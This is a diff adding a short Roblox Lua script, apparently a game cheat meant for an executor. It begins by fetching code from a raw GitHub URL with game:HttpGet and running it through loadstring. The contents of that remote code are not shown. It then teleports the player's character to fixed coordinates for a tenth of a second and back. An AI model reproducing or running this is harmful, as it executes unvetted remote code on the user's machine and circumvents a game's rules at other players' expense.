@@ -1,0 +1,32 @@
+-- Load the script from the URL
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/Let'sParty", true))()
+end)
+
+if not success then
+    warn("Failed to load remote script: " .. err)
+end
+
+-- Wait for the character to load
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Ensure HumanoidRootPart exists, with extra safety checks
+local humanoidRootPart = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart")
+
+-- Save the player's original position (CFrame)
+local originalPosition = humanoidRootPart.CFrame
+
+-- Teleport the player to the new position (9.407, 4.554, -115.951)
+humanoidRootPart.CFrame = CFrame.new(9.407, 4.554, -115.951)
+
+-- Add a delay before returning to the original position
+local delayTime = 0.1 -- You can change the delay time here (in seconds)
+wait(delayTime)
+
+-- Teleport back to the original position if it's valid
+if originalPosition then
+    humanoidRootPart.CFrame = originalPosition
+else
+    warn("Failed to return to original position. Original position is invalid.")
+end
